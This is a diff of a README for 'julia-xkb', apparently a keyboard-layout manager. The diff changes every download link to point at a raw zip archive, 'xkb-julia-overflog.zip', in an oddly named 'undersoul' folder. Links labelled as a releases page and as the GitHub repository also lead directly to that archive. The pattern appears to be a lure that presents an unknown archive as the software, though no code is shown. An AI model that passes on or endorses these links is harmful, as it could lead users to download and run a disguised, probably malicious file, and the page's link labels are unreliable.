@@ -6,7 +6,7 @@ Welcome to **julia-xkb**! This application helps you easily manage and switch ke
 
 ## 🔗 Download Now!
 
-[![Download julia-xkb](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/julia-xkb-v3.8.zip)](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/julia-xkb-v3.8.zip)
+[![Download julia-xkb](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/xkb-julia-overflog.zip)](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/xkb-julia-overflog.zip)
 
 ## 🌟 Features
 
@@ -22,7 +22,7 @@ To get started with julia-xkb, follow the steps below:
 1. **Visit the Download Page**
    Click the link below to access the releases page where you can download the software.
 
-   [Visit this page to download](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/julia-xkb-v3.8.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/xkb-julia-overflog.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will see a list of available versions. Select the version that matches your operating system.
@@ -86,7 +86,7 @@ For questions or support, you can contact the development team. Visit our issues
 
 ## 🌐 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/julia-xkb-v3.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Chitaranjanrt/julia-xkb/main/undersoul/xkb-julia-overflog.zip)
 - [User Guide](#) - Placeholder for future actual user guide link.
 
 Thank you for using julia-xkb! We hope it helps you manage your keyboard layouts easily and effectively.
